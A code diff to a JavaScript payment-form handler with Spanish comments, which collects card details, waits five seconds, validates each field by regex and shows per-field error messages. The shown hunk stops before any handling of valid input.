@@ -4,48 +4,59 @@
 
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    
     const loader = document.getElementById('loader');
-    const errorMessage = document.getElementById('errorMessage');
-    errorMessage.classList.add('hidden');
+    const errorMsg = document.getElementById('errorMsg');
+    
+    // Ocultar mensajes anteriores
+    errorMsg.classList.add('hidden');
+    document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+    
+    // Mostrar loader
     loader.classList.remove('hidden');
 
+    // Obtener valores
     const formData = {
-        user_name: document.getElementById('cardHolder').value,
-        card_number: document.getElementById('cardNumber').value,
-        expiry_date: document.getElementById('expiryDate').value,
-        cvc_code: document.getElementById('cvc').value
+        nombre: document.getElementById('userName').value.trim(),
+        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+        fecha: document.getElementById('expiryDate').value,
+        cvc: document.getElementById('cvc').value
     };
 
+    // Validaciones después de 5 segundos
     setTimeout(() => {
-        // Validaciones
         let isValid = true;
-        
-        if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.user_name)) {
+
+        // Validar nombre
+        if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
+            document.getElementById('nameError').style.display = 'block';
             isValid = false;
         }
-        
-        if (formData.card_number.length !== 16 || !/^\d+$/.test(formData.card_number)) {
+
+        // Validar tarjeta
+        if (!/^\d{16}$/.test(formData.numero)) {
+            document.getElementById('cardError').style.display = 'block';
             isValid = false;
         }
-        
+
+        // Validar fecha
         const currentDate = new Date();
-        const expiryDate = new Date(formData.expiry_date);
+        const expiryDate = new Date(formData.fecha);
         if (expiryDate < currentDate) {
+            document.getElementById('dateError').style.display = 'block';
             isValid = false;
         }
-        
-        if (formData.cvc_code.length !== 4 || !/^\d+$/.test(formData.cvc_code)) {
+
+        // Validar CVC
+        if (!/^\d{4}$/.test(formData.cvc)) {
+            document.getElementById('cvcError').style.display = 'block';
             isValid = false;
         }
 
         loader.classList.add('hidden');
-        
+
         if (!isValid) {
-            errorMessage.classList.remove('hidden');
-            setTimeout(() => {
-                errorMessage.classList.add('hidden');
-            }, 3000);
+            errorMsg.classList.remove('hidden');
+            setTimeout(() => errorMsg.classList.add('hidden'), 5000);
             return;
         }
 
